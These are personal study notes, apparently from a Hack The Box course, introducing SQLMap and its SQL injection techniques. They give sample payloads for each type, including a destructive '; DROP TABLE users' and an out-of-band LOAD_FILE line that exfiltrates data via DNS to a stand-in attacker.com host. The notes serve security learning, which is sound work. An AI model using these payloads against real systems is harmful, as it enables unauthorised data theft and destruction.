
***
###### `Title :- Introduction`
###### `Created on :- 2023-06-21 - 19:33`
###### `Created by:- Prem J`
***

- [SQLMap](https://github.com/sqlmapproject/sqlmap) is a python based tool used to automate the process of detecting and exploiting SQLi.

```shell-session
prem@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

- shell session above is the working process of SQLMap. It has numerous features and a powerful detection engine, and a broad range of options and switches for fine tuning many aspects of SQL Injection.
- Below are the few features offered by SQLMap

|   |   |   |
|---|---|---|
|Target connection|Injection detection|Fingerprinting|
|Enumeration|Optimization|Protection detection and bypass using "tamper" scripts|
|Database content retrieval|File system access|Execution of the operating system (OS) commands|


automated installation --> `sudo apt install sqlmap`
manual Installation --> `git clone --depth=1 https://github.com/sql/sqlmapproject/sqlmap.git sqlmap-dev`

- SQLMap supports wide range of databases and the team works to add new DBMSes periodically.
- Supported Injection Types can be viewed through `sqlmap -hh` command

```shell-session
premjampuram@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

- The technique characters `BEUSTQ` refers to the following:

	- `B`: Boolean-based blind
	- `E`: Error-based
	- `U`: Union query-based
	- `S`: Stacked queries
	- `T`: Time-based blind
	- `Q`: Inline queries


![[Pasted image 20230616072058.png]]

#### `Boolean-based Blind SQLi -->`

- SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, effectively retrieving 1 byte of information per request.

```sql
AND 1=1
```

- the differentiation is based on the server responses to determine whether the SQL query returned `TRUE` (Marginal difference between regular server response) or `FALSE` (substantial difference between regular server response)
- ***It is the Most common SQLi Type is Web Applications***. 

#### `Error Bases SQLi -->`

- The DBMS Error are returned as a part of server response then there are specialised payloads in the SQLMap that target specific misbehaviour's.

```sql
AND GTID_SUBSET(@@version,0)
```

![[Pasted image 20230616220101.png]]

- Similar to this kind but not exactly.

>[!Note]
>Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

#### `Union Query Based SQLi -->`

- extending the original query using the union clause to retrieve our requirements.

```sql
UNION ALL SELECT 1,@@version,3
```

- This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

#### `Stacked Queries -->`

- Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one

```sql
; DROP TABLE users
```

- SQLMap can use such vulnerabilities to run non-query statements (INSERT, UPDATE, DELETE) executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

#### `Time-based Blind SQLi -->`

- Response Time is used as the source for differentiating `TRUE` (Noticeable difference in the response time compared to regular response) or `FALSE` (Substantial difference in the response time compared to regular response)

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

- In comparison with Boolean-based time-based SQLi is slower. It is used in cases where Boolean-based SQLi is not applicable. 

#### `Inline Queries -->`

- The type of injection embedded a query within in the original query.

```sql
SELECT (SELECT @@version) from
```

- Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

#### `Out-of-band SQLi -->`

- The ***most advanced types of SQLi***. This is used only if other types of SQLi are either unsupported or are too slow.

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

- SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.
- By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. 
- SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.